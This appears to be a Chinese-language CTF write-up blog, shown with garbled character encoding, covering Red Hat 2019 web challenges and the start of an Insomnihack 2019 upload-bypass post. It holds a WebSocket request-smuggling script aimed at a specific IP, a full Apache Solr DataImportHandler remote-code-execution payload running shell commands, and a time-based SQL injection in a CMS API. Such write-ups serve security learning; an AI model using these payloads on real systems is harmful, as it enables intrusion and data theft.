ä¸ºä¹‹å‰ä¸€ç›´åœ¨ç ”ç©¶ HTTP Smuggling çš„ä¸œè¥¿ï¼Œæˆ‘åœ¨è…¾è®¯çš„å¯¼å¸ˆä¹Ÿå¯¹è¿™ä¸ªæŒºæ„Ÿå…´è¶£çš„ï¼Œå‰é˜µå­ç»™æˆ‘å‘äº†ä¸€ä¸ª Websocket Smuggling\n \nçœ‹å®Œåä¸€è„¸æ‡µé€¼ï¼Œæ–‡ç« è·Ÿä¹‹å‰ Black Hat 2019 HTTP Desync é‚£ä¸ªè®®é¢˜ä¸€æ ·ï¼Œåªè¯´äº†æœ‰è¿™ä¹ˆä¸ªæ”»å‡»é¢ï¼Œä½†æ˜¯æ²¡æœ‰è¯´æ€ä¹ˆäº§ç”Ÿçš„ï¼Œä½†æ˜¯è¿˜å¥½ç»™äº† POC ä»¥åŠä¸€äº› challs ï¼Œè™½ç„¶æˆ‘å½“æ—¶å¤ç°äº†ä¸€ä¸‹ï¼Œä½†æ˜¯ä¾ç„¶æ‡µé€¼ã€‚\nç›´åˆ°ä½œè€…ç»ˆäºåœ¨å‰å‡ å¤©æŠŠ websocket-smuggle æ”»å‡»åŸç†ç”¨æ–‡ç« æè¿°äº†å‡ºæ¥ï¼Œæ°å·§è¿™æ¬¡æ¯”èµ›ä¹Ÿå‡ºåˆ°äº†è¿™ä¹ˆä¸ªé¢˜ç›®ï¼Œæ‰€ä»¥çœ‹åˆ°é¢˜ç›®ç”¨äº† websocket ï¼Œæˆ‘å°±çŒœå¯èƒ½æ˜¯è¿™ä¸ªæ”»å‡»é¢äº†ã€‚\nè¿™ä¸ªæ”»å‡»é¢æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå¸®å¤§å®¶ä¸€å¥è¯æ€»ç»“å°±æ˜¯åœ¨ websocket å»ºç«‹è¿æ¥æ—¶ï¼Œå¦‚æœåå‘ä»£ç†æ²¡æœ‰å®Œå…¨ä¸¥æ ¼éµå®ˆ RFC 6445 æ ‡å‡†ï¼Œåœ¨å¤„ç†Sec-WebSocket-Version ç‰ˆæœ¬é”™è¯¯çš„æƒ…å†µå¹¶æ²¡æœ‰åšå¥½ç›¸åº”çš„å¤„ç†ï¼Œå¯¼è‡´äº†ä¿æŒäº†å®¢æˆ·ç«¯ä¸åç«¯æœåŠ¡å™¨ TCP/TLS çš„è¿æ¥ï¼Œæ‰€ä»¥é€ æˆäº†æˆ‘ä»¬å¯ä»¥è¿›è¡Œ Smuggling è¯·æ±‚çš„æ”»å‡»ï¼Œè¿™é‡Œç›´æ¥è¡¨ç°ä¸ºå¯ä»¥é€šè¿‡è¿™ç§æ”»å‡»è®¿é—®å†…ç½‘ã€‚\næˆ‘ä»¬å†å›åˆ°é¢˜ç›®ï¼Œé¢˜ç›®çš„ zz å®¢æœåªä¼šé‡å¤ä¸€å¥è¯\n â€‹\tæˆ‘ä»¬åŸºäºsolræä¾›ä¼˜è´¨çš„é“¶è¡Œä¿¡æ¯æœç´¢æœåŠ¡ã€‚\n é‚£åº”è¯¥å°±æ˜¯æç¤º solr äº†ï¼Œå‰é˜µå­æœ‰ä¸ª solr RCE \u0026hellip;ä½†æ˜¯æˆ‘ä»¬ç›´æ¥è®¿é—® solr æœåŠ¡æ˜¯ 403 \u0026hellip;\näºæ˜¯æˆ‘ä»¬å°è¯•ç›´æ¥ç”¨ Smuggling æ¢æµ‹ solr æœåŠ¡\nimport socket req1 = \u0026#34;\u0026#34;\u0026#34;GET /socket.io/?EIO=3\u0026amp;transport=websocket HTTP/1.1 Host: 47.105.57.19:3000 Sec-WebSocket-Version: 1338 Upgrade: websocket Cookie: user=admin; io=wdvnH-5hbXMU4XPFAC_O \u0026#34;\u0026#34;\u0026#34;.replace(\u0026#39;\\n\u0026#39;, \u0026#39;\\r\\n\u0026#39;) req2 = \u0026#34;\u0026#34;\u0026#34;GET /solr HTTP/1.1 Host: localhost:8983 \u0026#34;\u0026#34;\u0026#34;.replace(\u0026#39;\\n\u0026#39;, \u0026#39;\\r\\n\u0026#39;) def main(netloc): host, port = netloc.split(\u0026#39;:\u0026#39;) sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((host, int(port))) sock.sendall(req1) sock.recv(4096) sock.sendall(req2) # print req2 data = sock.recv(4096) data = data.decode(errors = \u0026#39;ignore\u0026#39;) print(data) data = sock.recv(4096) data = data.decode(errors = \u0026#39;ignore\u0026#39;) print(data) sock.shutdown(socket.SHUT_RDWR) sock.close() if __name__ == \u0026#34;__main__\u0026#34;: main(\u0026#39;47.105.57.19:3000\u0026#39;) å‘ç°æ˜¯ä¸ª302è·³è½¬\u0026hellip;\n \nçœ‹æ¥è¿˜æ˜¯å¾—èµ·æœ¬åœ°ç¯å¢ƒæ¥è¯•è¯•çœ‹ï¼Œåˆšå¥½ vulhub æœ‰ä¸€ä¸ªç¯å¢ƒï¼ˆpç‰›è¾£æ˜¯çœŸçš„ç‰›æ‰¹\nç›´æ¥èµ·èµ·æ¥ï¼Œç„¶åå‘ç° solr çš„å…¥å£æ˜¯ /solr/#/ ï¼Œç„¶åæˆ‘ä»¬æŠŠ req2 çš„è¯·æ±‚éƒ¨åˆ†æ”¹æˆ /solr/#/å°±å¯ä»¥çœ‹åˆ°é¡µé¢å†…å®¹äº†\nreq2 = \u0026#34;\u0026#34;\u0026#34;GET /solr/#/ HTTP/1.1 Host: localhost:8983 \u0026#34;\u0026#34;\u0026#34;.replace(\u0026#39;\\n\u0026#39;, \u0026#39;\\r\\n\u0026#39;) å¯æƒœè¿™ä¸ª Smuggling æŠ€æœ¯è²Œä¼¼æ²¡æœ‰ç›´æ¥èƒ½åƒä»£ç†ä¸€æ ·çš„åŠŸèƒ½ï¼Œä¸èƒ½ç”¨æµè§ˆå™¨ç›´æ¥æµè§ˆå†…å®¹ï¼Œæ¯æ¬¡åªèƒ½è‡ªå·±å»åˆ†æå›æ˜¾ï¼Œä¸è¿‡è¿™ä¸ªé¢˜ä¹Ÿä¸éœ€è¦ç”¨åˆ°æ¸²æŸ“äº¤äº’ä»€ä¹ˆçš„ï¼Œç›´æ¥éƒ½æ˜¯å¯ä»¥å‘é€ api è¯·æ±‚çš„ã€‚\näºæ˜¯æˆ‘ä»¬æœ¬åœ°èµ·ç¯å¢ƒï¼Œç”¨ Github ä¸Šå‡ ä¸ª exp è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°æœ‰å¤–è¿çš„æˆ‘æœ¬åœ°å¯ä»¥æˆåŠŸï¼Œä½†æ˜¯æ‰“è¿œç¨‹ä¸è¡Œ\u0026hellip;\nç„¶åæˆ‘ä»”ç»†çœ‹äº† solr_exploit poc ä»¥åŠ PoCç¬¬ä¸‰é˜¶æ®µ\u0026ndash;æ— å¤–è¿+æœ‰å›æ˜¾ï¼Œæƒ³å¿…åº”è¯¥å°±æ˜¯è¿™ä¸ªäº†å§ï¼Œåæ¥ç»™å‡ºçš„ hint ä¹ŸéªŒè¯äº†è¿™ä¸€ç‚¹ï¼Œå°±æ˜¯éœ€è¦æ„é€ é‚£ç¯‡æ–‡ç« å½“ä¸­æ‰“äº†ç çš„ POC (åˆæ˜¯ä¸€ä¸ªçœ‹å›¾çŒœ POC çš„é¢˜ï¼Œæˆ‘è¦åäº†\nä¾§ä¿¡é“æ”»å‡» äºæ˜¯æˆ‘æ‹¿ç€è¿™ä¸ªå›¾æ‰¾äº†ä¸€äº› PS å¤§ç¥è¿›è¡Œå¤„ç†ï¼Œç»“æœæ·˜å®å–å®¶è¯´æˆ‘æ˜¯ç¬¬å››ä¸ªæ‰¾ä»–ä»¬å¤„ç†çš„äººäº†.jpg\näºæ˜¯å¼€å§‹äº†æ¼«æ¼« POC çŒœæµ‹ä¹‹è·¯ï¼Œé¦–å…ˆæˆ‘ä»¬çœ‹å›¾å¯ä»¥å‘ç°å›¾ä¸­æœ‰ä¸¤ä¸ªè“è‰²çš„å¿«ï¼Œé‚£ä¹ˆç¬¬ä¸€è¡Œæœ‰æ²¡æœ‰å¯èƒ½æ˜¯:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; è®©æˆ‘ä»¬è¯•è¯•çœ‹ï¼ŒæŠŠ burp ä¸æ–‡ç«  burp æ‹‰åˆ°åŒæ ·é«˜åº¦ï¼Œç„¶å xml æ ‡ç­¾ä¹‹åéšä¾¿å¼„å‡ ä¸ª payload\n \næˆ‘é ï¼Œç®€ç›´ä¸€æ¯›ä¸€æ · XD\næˆ‘æ„Ÿè§‰æˆ‘è¦ä¸€è¡€äº†ï¼Œä¾§ä¿¡é“æ”»å‡»çœŸçš„ç‰›æ‰¹ã€‚ç„¶è€Œæ­£å¦‚ä¸Šå›¾ï¼Œä»–å–µçš„è¿˜æ˜¯æ²¡å›æ˜¾å•Š\u0026hellip;\n \nEmmm\u0026hellip;.é™·å…¥æ²‰æ€\nç¨åŠ æ€ç´¢ åœ¨ github é‚£ä¸ª repo ä¸­æˆ‘ä»¬å¯ä»¥å‘ç°å…¶å®æ£€æµ‹æ¼æ´ - Exploit2ç”¨çš„ä¹Ÿæ˜¯ @Longofo å¸ˆå‚…åœ¨é‚£ç¯‡æ–‡ç« è¯´çš„ ContentStreamSource\n â€‹\tåœ¨ç›¸å…³æ¦‚å¿µä¸­è¯´åˆ°äº†ContentStreamDataSourceèƒ½æ¥æ”¶Postæ•°æ®ä½œä¸ºæ•°æ®æºï¼Œç»“åˆç¬¬ä¸€é˜¶æ®µè¯´åˆ°çš„dynamicFieldå°±èƒ½å®ç°å›æ˜¾äº†ã€‚\n ä¸€å¼€å§‹ä¸ç†Ÿæ‚‰ java çš„æˆ‘çœ‹åˆ°è¿™ä¹Ÿå¾ˆæ‡µé€¼ï¼Œæ€ä¹ˆå°±èƒ½å®ç°å›æ˜¾äº†\u0026hellip;ç„¶åæˆ‘ä»¬å¯ä»¥çœ‹çœ‹é‚£ä¸ª github repo exp2ï¼Œæˆ‘ä¹Ÿç€å®çœ‹äº†å¥½ä¹…\nåœ¨æˆ‘ç”¨è¿™ä¸ª exp2 çš„ç¬¬å››æ­¥ï¼Œä¹Ÿå°±æ˜¯å¼€å¯è¿œç¨‹æµè¿™ä¸ªæ­¥éª¤ï¼Œå¦‚æœç›´æ¥æŒ‰ç…§è¿™ä¸ªåšæ³•çš„è¯ï¼Œæ˜¯ç›´æ¥å¾—åˆ°äº† 403 Forbidden\n â€‹\tè¯¥æ­¥éª¤æ˜¯ä¸ºäº†ä¿®æ”¹configoverlay.jsonæ–‡ä»¶ä¸­çš„é…ç½® ä»¥å¯ç”¨è¿œç¨‹æµçš„ç›¸å…³é€‰é¡¹ .enableStreamBody .enableRemoteStreaming\næ›¿æ¢tikaä¸ºç´¢å¼•åº“åç§°\nPOST /solr/tika/config HTTP/1.1 Host: 127.0.0.1 Accept: */* Content-type:application/json Content-Length: 159 Connection: close {\u0026quot;set-property\u0026quot;: {\u0026quot;requestDispatcher.requestParsers.enableRemoteStreaming\u0026quot;: true}, \u0026quot;set-property\u0026quot;: {\u0026quot;requestDispatcher.requestParsers.enableStreamBody\u0026quot;: true}} å“åº”200å³æˆåŠŸ(å®é™…æµ‹è¯• 8.1å¯ä»¥æˆåŠŸ)\nå“åº”500å³å¤±è´¥(å®é™…æµ‹è¯• æŸäº›ä½ç‰ˆæœ¬ä¼šå¤±è´¥)\n æ‰€ä»¥æˆ‘ä»¬ä¸å¾—ä¸åªèƒ½èµ°å¦ä¸€ç§æ–¹å¼ï¼Œä¸ç”¨å¼€å¯ streambody çš„æ–¹æ³•ã€‚\nç„¶åå¼€å§‹äº†æ¼«é•¿çš„ fuzz è¿‡ç¨‹ï¼Œå¯èƒ½æˆ‘ç†è§£å¾—æ¯”è¾ƒæ…¢ï¼Œå¯¼è‡´åšçš„ä¹Ÿæ¯”è¾ƒæ…¢ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªåˆ©ç”¨ streambody æ„é€ çš„ POC\nPOST /solr/tika/dataimport?command=full-import\u0026amp;verbose=false\u0026amp;clean=false\u0026amp;commit=false\u0026amp;debug=true\u0026amp;core=tika\u0026amp;name=dataimport\u0026amp;dataConfig=%0a%3c%64%61%74%61%43%6f%6e%66%69%67%3e%0a%3c%64%61%74%61%53%6f%75%72%63%65%20%6e%61%6d%65%3d%22%73%74%72%65%61%6d%73%72%63%22%20%74%79%70%65%3d%22%43%6f%6e%74%65%6e%74%53%74%72%65%61%6d%44%61%74%61%53%6f%75%72%63%65%22%20%6c%6f%67%67%65%72%4c%65%76%65%6c%3d%22%54%52%41%43%45%22%20%2f%3e%0a%0a%20%20%3c%73%63%72%69%70%74%3e%3c%21%5b%43%44%41%54%41%5b%0a%20%20%20%20%20%20%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%70%6f%63%28%72%6f%77%29%7b%0a%20%76%61%72%20%62%75%66%52%65%61%64%65%72%20%3d%20%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%69%66%63%6f%6e%66%69%67%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%3b%0a%0a%76%61%72%20%72%65%73%75%6c%74%20%3d%20%5b%5d%3b%0a%0a%77%68%69%6c%65%28%74%72%75%65%29%20%7b%0a%76%61%72%20%6f%6e%65%6c%69%6e%65%20%3d%20%62%75%66%52%65%61%64%65%72%2e%72%65%61%64%4c%69%6e%65%28%29%3b%0a%72%65%73%75%6c%74%2e%70%75%73%68%28%20%6f%6e%65%6c%69%6e%65%20%29%3b%0a%69%66%28%21%6f%6e%65%6c%69%6e%65%29%20%62%72%65%61%6b%3b%0a%7d%0a%0a%72%6f%77%2e%70%75%74%28%22%74%69%74%6c%65%22%2c%72%65%73%75%6c%74%2e%6a%6f%69%6e%28%22%5c%6e%5c%72%22%29%29%3b%0a%72%65%74%75%72%6e%20%72%6f%77%3b%0a%0a%7d%0a%0a%5d%5d%3e%3c%2f%73%63%72%69%70%74%3e%0a%0a%3c%64%6f%63%75%6d%65%6e%74%3e%0a%20%20%20%20%3c%65%6e%74%69%74%79%0a%20%20%20%20%20%20%20%20%73%74%72%65%61%6d%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%6e%61%6d%65%3d%22%65%6e%74%69%74%79%31%22%0a%20%20%20%20%20%20%20%20%64%61%74%61%73%6f%75%72%63%65%3d%22%73%74%72%65%61%6d%73%72%63%31%22%0a%20%20%20%20%20%20%20%20%70%72%6f%63%65%73%73%6f%72%3d%22%58%50%61%74%68%45%6e%74%69%74%79%50%72%6f%63%65%73%73%6f%72%22%0a%20%20%20%20%20%20%20%20%72%6f%6f%74%45%6e%74%69%74%79%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%66%6f%72%45%61%63%68%3d%22%2f%52%44%46%2f%69%74%65%6d%22%0a%20%20%20%20%20%20%20%20%74%72%61%6e%73%66%6f%72%6d%65%72%3d%22%73%63%72%69%70%74%3a%70%6f%63%22%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%66%69%65%6c%64%20%63%6f%6c%75%6d%6e%3d%22%74%69%74%6c%65%22%20%78%70%61%74%68%3d%22%2f%52%44%46%2f%69%74%65%6d%2f%74%69%74%6c%65%22%20%2f%3e%0a%20%20%20%20%3c%2f%65%6e%74%69%74%79%3e%0a%3c%2f%64%6f%63%75%6d%65%6e%74%3e%0a%3c%2f%64%61%74%61%43%6f%6e%66%69%67%3e%0a%20%20%20%20%0a%20%20%20%20%20%20%20%20%20%20%20 HTTP/1.1 Host: solr.com:8983 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://solr.com:8983/solr/ Content-Length: 212 content-type: multipart/form-data; boundary=------------------------aceb88c2159f183f --------------------------aceb88c2159f183f Content-Disposition: form-data; name=\u0026#34;stream.body\u0026#34; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;RDF\u0026gt; \u0026lt;item/\u0026gt; \u0026lt;/RDF\u0026gt; --------------------------aceb88c2159f183f-- å…¶ä¸­ urlencode éƒ¨åˆ†æ˜¯ï¼š\n\u0026lt;dataConfig\u0026gt; \u0026lt;dataSource name=\u0026#34;streamsrc\u0026#34; type=\u0026#34;ContentStreamDataSource\u0026#34; loggerLevel=\u0026#34;TRACE\u0026#34; /\u0026gt; \u0026lt;script\u0026gt;\u0026lt;![CDATA[ function poc(row){ var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\u0026#34;ifconfig\u0026#34;).getInputStream())); var result = []; while(true) { var oneline = bufReader.readLine(); result.push( oneline ); if(!oneline) break; } row.put(\u0026#34;title\u0026#34;,result.join(\u0026#34;\\n\\r\u0026#34;)); return row; } ]]\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;document\u0026gt; \u0026lt;entity stream=\u0026#34;true\u0026#34; name=\u0026#34;entity1\u0026#34; datasource=\u0026#34;streamsrc1\u0026#34; processor=\u0026#34;XPathEntityProcessor\u0026#34; rootEntity=\u0026#34;true\u0026#34; forEach=\u0026#34;/RDF/item\u0026#34; transformer=\u0026#34;script:poc\u0026#34;\u0026gt; \u0026lt;field column=\u0026#34;title\u0026#34; xpath=\u0026#34;/RDF/item/title\u0026#34; /\u0026gt; \u0026lt;/entity\u0026gt; \u0026lt;/document\u0026gt; \u0026lt;/dataConfig\u0026gt; åˆ©ç”¨ ContentStreamDataSource æŠŠ stream.body ä½œä¸ºæ•°æ®æºè¿›è¡Œå¤„ç†ã€‚å…¶å®çœ‹åˆ°è¿™ï¼Œå†æ ¹æ®æ–‡ç« ä¸­æ‰€æè¿°çš„ï¼š\n â€‹\tåœ¨ç›¸å…³æ¦‚å¿µä¸­è¯´åˆ°äº†ContentStreamDataSourceèƒ½æ¥æ”¶Postæ•°æ®ä½œä¸ºæ•°æ®æºï¼Œç»“åˆç¬¬ä¸€é˜¶æ®µè¯´åˆ°çš„dynamicFieldå°±èƒ½å®ç°å›æ˜¾äº†ã€‚\n å…¶å®æˆ‘ä»¬çš„ POC ä¹Ÿå‘¼ä¹‹æ¬²å‡ºäº†ã€‚\nåªè¦å»æ‰ stream.body ï¼Œä½¿ç”¨ POST XML ä½œä¸ºæ•°æ®æºï¼Œå†é…åˆ dynamicField çš„ç‰¹æ€§ï¼Œå°±å¯ä»¥æŠŠå›æ˜¾è¾“å‡ºåˆ° document å½“ä¸­äº†ã€‚\näºæ˜¯æˆ‘ä»¬å¯ä»¥å¤§æ¦‚è¿™ä¹ˆå»æ„é€  dataConfig\n\u0026lt;dataConfig\u0026gt; \u0026lt;dataSource name=\u0026#34;streamsrc\u0026#34; type=\u0026#34;ContentStreamDataSource\u0026#34; loggerLevel=\u0026#34;TRACE\u0026#34; /\u0026gt; \u0026lt;script\u0026gt;\u0026lt;![CDATA[ function poc(row){ var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\u0026#34;ls\u0026#34;).getInputStream())); var result = []; while(true) { var oneline = bufReader.readLine(); result.push( oneline ); if(!oneline) break; } row.put(\u0026#34;id\u0026#34;,result.join(\u0026#34;\\n\\r\u0026#34;)); return row; } ]]\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;document\u0026gt; \u0026lt;entity name=\u0026#34;streamxml\u0026#34; datasource=\u0026#34;streamsrc1\u0026#34; processor=\u0026#34;XPathEntityProcessor\u0026#34; forEach=\u0026#34;/RDF/item\u0026#34; transformer=\u0026#34;script:poc\u0026#34;\u0026gt; \u0026lt;field column=\u0026#34;id\u0026#34; xpath=\u0026#34;/RDF/item/id\u0026#34; name=\u0026#34;id_s\u0026#34; type=\u0026#34;string\u0026#34;/\u0026gt; \u0026lt;/entity\u0026gt; \u0026lt;/document\u0026gt; \u0026lt;/dataConfig\u0026gt; ç›´æ¥åˆ©ç”¨é»˜è®¤é…ç½®çš„ id fileld è¿›è¡Œå›æ˜¾ï¼Œç„¶åå°†ä¹‹å‰ stream body çš„æ”¹æˆ xml å‘é€ post è¯·æ±‚å³å¯ã€‚\nPOST /solr/test1/dataimport?command=full-import\u0026amp;verbose=false\u0026amp;clean=false\u0026amp;commit=false\u0026amp;debug=true\u0026amp;core=test1\u0026amp;name=dataimport\u0026amp;dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22ls%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22id%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20name%3D%22streamxml%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22id%22%20xpath%3D%22%2FRDF%2Fitem%2Fid%22%20name%3D%22id_s%22%20type%3D%22string%22%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20 HTTP/1.1 Host: zedd.vv:8983 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Length: 62 Content-Type: application/xml;charset=utf-8 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;RDF\u0026gt; \u0026lt;item/\u0026gt; \u0026lt;/RDF\u0026gt;  \nè¿™æ ·æˆ‘ä»¬å°±æˆåŠŸæ„é€ äº†å›æ˜¾ï¼Œç„¶åç”¨ smuggling æ–¹æ³•å‘é€ä¸Šé¢çš„è¯·æ±‚å°±å¯ä»¥äº†ã€‚\n \nç»™æ¯”æˆ‘åšçš„å¿«çš„å¸ˆå‚…é€’èŒ¶tqlï¼Œè‡ªå·±è¿˜æ˜¯åšçš„å¤ªæ…¢äº†orz\u0026hellip;\næ–‡ä¸­çš„POCä»…ä¾›æœ¬æ¬¡åšé¢˜å­¦ä¹ äº¤æµï¼Œåˆ‡å‹¿ç”¨äºéæ³•ç”¨é€”\neasyweb å½“æ—¶åšå®Œ bank_service å°±å»ç¡äº†ï¼Œç¬¬äºŒå¤©é†’æ¥å°±ç»“æŸå°±æ²¡çœ‹è¿™é“é¢˜ï¼Œåæ¥é—®äº†é—®å‰å‡ çš„å¸ˆå‚…ä»¬ï¼Œæ˜¯ä¸ª sql æ³¨å…¥çš„é¢˜ã€‚\nä¸€ä¸ªCMSï¼Œå®˜ç½‘æ˜¯è¡Œäº‘æµ·CMSï¼Œé¢˜ç›®æ˜¯æœ€æ–°çš„ç‰ˆæœ¬ï¼Œç„¶åæˆ‘å»çœ‹äº†ä¸€ä¸‹ï¼Œä¸»è¦é—®é¢˜åœ¨App/Api/Controller/LtController.class.phpå½“ä¸­ï¼Œæœ‰å¥½å‡ ä¸ªåœ°æ–¹ï¼Œæ¯”å¦‚\npublic function gbooklist() { ... $order_by = I(\u0026#39;orderby\u0026#39;, \u0026#39;id DESC\u0026#39;); ... $_list = M(\u0026#39;guestbook\u0026#39;)-\u0026gt;where($where)-\u0026gt;order($order_by)-\u0026gt;limit($limit)-\u0026gt;select(); } å¯¹äº I å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°å¹¶æ²¡æœ‰åšä»»ä½•çš„å¤„ç†\n/** * è·å–è¾“å…¥å‚æ•° æ”¯æŒè¿‡æ»¤å’Œé»˜è®¤å€¼ * ä½¿ç”¨æ–¹æ³•: * \u0026lt;code\u0026gt; * I(\u0026#39;id\u0026#39;,0); è·å–idå‚æ•° è‡ªåŠ¨åˆ¤æ–­getæˆ–è€…post * I(\u0026#39;post.name\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;htmlspecialchars\u0026#39;); è·å–$_POST[\u0026#39;name\u0026#39;] * I(\u0026#39;get.\u0026#39;); è·å–$_GET * \u0026lt;/code\u0026gt; * @param string $name å˜é‡çš„åç§° æ”¯æŒæŒ‡å®šç±»å‹ * @param mixed $default ä¸å­˜åœ¨çš„æ—¶å€™é»˜è®¤å€¼ * @param mixed $filter å‚æ•°è¿‡æ»¤æ–¹æ³• * @param mixed $datas è¦è·å–çš„é¢å¤–æ•°æ®æº * @return mixed */ function I($name,$default=\u0026#39;\u0026#39;,$filter=null,$datas=null) äºæ˜¯æˆ‘ä»¬å¯ä»¥è®¿é—®index.php?s=Api/lt/gbooklist\u0026amp;orderby=1;SELECT SLEEP(5)%23å¾—åˆ°æ˜æ˜¾çš„æ—¶é—´å»¶è¿Ÿï¼Œè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ç”¨ sqlmap æ—¶é—´ç›²æ³¨å°±è¡Œäº†ã€‚\nåŒæ ·çš„ï¼Œè¯¥æ–‡ä»¶é‡Œçš„taglist/alist/slist/reviewlistå‡½æ•°éƒ½æœ‰ç›¸åŒçš„åœ°æ–¹å­˜åœ¨æ³¨å…¥ï¼Œè¯¥é¢˜çš„ flag ä¹Ÿåœ¨æ•°æ®åº“é‡Œé¢ï¼Œæ‰€ä»¥ç”¨ sqlmap è·‘è·‘å°±å‡ºæ¥äº†ã€‚\næ–‡ä¸­çš„POCä»…ä¾›æœ¬æ¬¡åšé¢˜å­¦ä¹ äº¤æµï¼Œåˆ‡å‹¿ç”¨äºéæ³•ç”¨é€”\n","date":"2019-11-13T15:18:06Z","permalink":"https://blog.zeddyu.info/2019/11/13/Red-Hat-2019/","title":"Red Hat 2019 Web Write Up"},{"content":"å› ä¸º Insomnihack 2019 l33t-hoster è¿™é“é¢˜è·Ÿ XNUCA 2019 Qualifier Ezphp å¦‚å‡ºä¸€è¾™ï¼Œæ¯”è¾ƒç±»ä¼¼ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„ä¸€é¢˜ï¼Œæ‰€ä»¥ä¸¤ä¸ªé¢˜å°±æ”¾åœ¨ä¸€èµ·å†™äº†\nL33T-HOSTER é¢˜ç›®åœ¨?sourceç›´æ¥ç»™å‡ºäº†æºç \n\u0026lt;?php if (isset($_GET[\u0026#34;source\u0026#34;])) die(highlight_file(__FILE__)); session_start(); if (!isset($_SESSION[\u0026#34;home\u0026#34;])) { $_SESSION[\u0026#34;home\u0026#34;] = bin2hex(random_bytes(20)); } $userdir = \u0026#34;images/{$_SESSION[\u0026#34;home\u0026#34;]}/\u0026#34;; if (!file_exists($userdir)) { mkdir($userdir); } $disallowed_ext = array( \u0026#34;php\u0026#34;, \u0026#34;php3\u0026#34;, \u0026#34;php4\u0026#34;, \u0026#34;php5\u0026#34;, \u0026#34;php7\u0026#34;, \u0026#34;pht\u0026#34;, \u0026#34;phtm\u0026#34;, \u0026#34;phtml\u0026#34;, \u0026#34;phar\u0026#34;, \u0026#34;phps\u0026#34;, ); if (isset($_POST[\u0026#34;upload\u0026#34;])) { if ($_FILES[\u0026#39;image\u0026#39;][\u0026#39;error\u0026#39;] !== UPLOAD_ERR_OK) { die(\u0026#34;yuuuge fail\u0026#34;); } $tmp_name = $_FILES[\u0026#34;image\u0026#34;][\u0026#34;tmp_name\u0026#34;]; $name = $_FILES[\u0026#34;image\u0026#34;][\u0026#34;name\u0026#34;]; $parts = explode(\u0026#34;.\u0026#34;, $name); $ext = array_pop($parts); if (empty($parts[0])) { array_shift($parts); } if (count($parts) === 0) { die(\u0026#34;lol filename is empty\u0026#34;); } if (in_array($ext, $disallowed_ext, TRUE)) { die(\u0026#34;lol nice try, but im not stupid dude...\u0026#34;); } $image = file_get_contents($tmp_name); if (mb_strpos($image, \u0026#34;\u0026lt;?\u0026#34;) !== FALSE) { die(\u0026#34;why would you need php in a pic.....\u0026#34;); } if (!exif_imagetype($tmp_name)) { die(\u0026#34;not an image.\u0026#34;); } $image_size = getimagesize($tmp_name); if ($image_size[0] !== 1337 || $image_size[1] !== 1337) { die(\u0026#34;lol noob, your 